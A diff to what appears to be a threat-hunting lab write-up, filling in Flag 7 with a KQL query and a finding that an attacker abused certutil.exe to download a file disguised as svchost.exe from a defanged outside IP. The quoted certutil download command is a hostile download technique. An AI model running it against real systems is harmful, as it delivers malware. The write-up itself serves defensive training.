@@ -156,15 +156,17 @@ DeviceRegistryEvents
 ---
 ##  Flag 7 – Identify the Windows-native binary the attacker abused to download files
 
-**Objective**: 
+**Finding**: The attacker abused `certutil.exe` to download malicious content from `http[:]//78[.]141[.]196[.]6[:]8080/` to the created file `svchost.exe`.  
+**Command Used**: `certutil.exe -urlcache -f http[:]//78[.]141[.]196[.]6[:]8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
 
-**Finding**:  
 
 **KQL Query**:
 ```
+DeviceFileEvents
+| where DeviceName == "azuki-sl"
+| where FolderPath contains "WindowsCache"
+| order by Timestamp desc
 ```
-
-**Notes:**
 ---
 
 ##  Flag 8 – Identify the name of the scheduled task created for persistence
